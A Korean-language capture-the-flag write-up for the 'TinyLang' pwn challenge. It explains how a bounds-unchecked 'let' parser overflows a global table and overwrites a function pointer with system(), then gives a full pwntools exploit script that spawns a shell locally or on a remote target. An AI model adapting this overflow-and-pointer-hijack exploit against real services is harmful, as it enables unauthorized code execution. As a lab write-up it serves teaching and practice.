---
ctf_name: "Vishwa CTF 2026"
challenge_name: "TinyLang"
category: "pwn"
difficulty: "medium"
author: "ch01jw"
date: "2026-04-07"
tags: [RCE]
---


## 초기분석
문제 설명에서 주어지듯 let 과 print 명령어가 실행이가능하다.

```C
xmmword_4148 = (__int128)_mm_unpacklo_epi64((__m128i)(unsigned __int64)error, (__m128i)(unsigned __int64)error);
```

main의 시작부에서 함수 포인터를 지정해주고 , 
```C
int __fastcall print_identifier_or_dispatch(char *identifier_name)
{
  int binding_count; // r14d
  int binding_index; // ebx
  const char *binding_name; // rbp

  binding_count = g_binding_count;
  if ( g_binding_count <= 0 )
    return (*((__int64 (__fastcall **)(char *))&g_fallback_handler_pair + 1))(identifier_name);
  binding_index = 0;
  for ( binding_name = g_bindings; strcmp(binding_name, identifier_name); binding_name += 20 )
  {
    if ( ++binding_index == binding_count )
      return (*((__int64 (__fastcall **)(char *))&g_fallback_handler_pair + 1))(identifier_name);
  }
  return printf("%d\n", *(_DWORD *)&g_bindings[20 * binding_index + 16]);
}
```

이후 print의 로직에서 해당 함수 포인터를 실행한다.

```C
// attributes: thunk
int system_thunk(const char *command)
{
  return system(command);
}
```
코드 상에서 system 이 존재하기에, 전역변수로 지정된 함수포인터를 system 함수로 바꿔준 이후 , /bin/sh 를 print 하게 되면 쉘이 나올것이다. 

```C
  if ( !strncmp(input_line, "let ", 4u) )
  {
    assignment_separator = strstr(input_line + 4, " = ");
    if ( assignment_separator )
    {
      *assignment_separator = 0;
      parsed_value = __isoc23_strtol((__int64)(assignment_separator + 3), 0, 10);
      entry_index_times_five = 5LL * g_binding_count;
      *(__m128i *)&g_bindings[4 * entry_index_times_five] = _mm_loadu_si128((const __m128i *)(input_line + 4));
      *(__m128i *)&g_bindings[4 * entry_index_times_five + 16] = _mm_loadu_si128((const __m128i *)(input_line + 0x14));
      *(__m128i *)&g_bindings[4 * entry_index_times_five + 32] = _mm_loadu_si128((const __m128i *)(input_line + 0x24));
      *(__m128i *)&g_bindings[4 * entry_index_times_five + 48] = _mm_loadu_si128((const __m128i *)(input_line + 0x34));
      LODWORD(entry_index_times_five) = g_binding_count + 1;
      *(_DWORD *)&g_bindings[20 * g_binding_count + 16] = parsed_value;
      g_binding_count = entry_index_times_five;
    }
```

해당 부분은  let의 파싱 부분이다. 변수명을 바꿨는데 더 보기 어렵긴하다. 다만 핵심 로직은 경계검사가 존재하지않아 overflow가 가능하다. 

메모리 구조는 입력이 파싱되는 부분 이후 파싱 위치에 대한 수 , 이후 함수 포인터가 존재한다.
함수 포인터를 system으로 덮어준 뒤 , /bin/sh 를 인자로 주면 쉘이 나온다.

payload.
```python
from pwn import *
import sys

if len(sys.argv) == 3:
    p = remote(sys.argv[1], int(sys.argv[2]))
else:
    p = process("./main_ltbov0N")

e = ELF("./main_ltbov0N")

p.recvuntil(b"at: ")
dli_fbase = int(p.recvline().strip(), 16)
log.info(f"dli_fbase: {hex(dli_fbase)}")
e.address = dli_fbase
system = e.address + 0x12C0
error = e.address + 0x12A0
print(f"system: {hex(system)}")


def to_bytes(x):
    if isinstance(x, bytes):
        return x
    return str(x).encode()


def let(name, value):
    payload = b"let " + to_bytes(name) + b" = " + to_bytes(value) + b"\n"
    p.send(payload)


def print_logic(name):
    payload = b"print " + to_bytes(name) + b"\n"
    p.send(payload)


for i in range(5):
    let(f"a{i}", i)
    print(f"name : a{i}, value : {i}")

payload1 = bytearray(b"let " + b"B" * 68 + b"\n")
payload1[8:11] = b" = "
payload1[11:12] = b"0"
payload1[64:68] = p32(5)
print(f"payload1: {payload1}")
p.send(payload1)

payload2 = bytearray(b"let " + b"C" * 68 + b"\n")
payload2[8:11] = b" = "
payload2[11:12] = b"0"
payload2[44:48] = p32(6)
payload2[52:60] = p64(system)
payload2[60:68] = p64(system)
print(f"payload2: {payload2}")
p.send(payload2)

print_logic("/bin/sh")
p.interactive()
```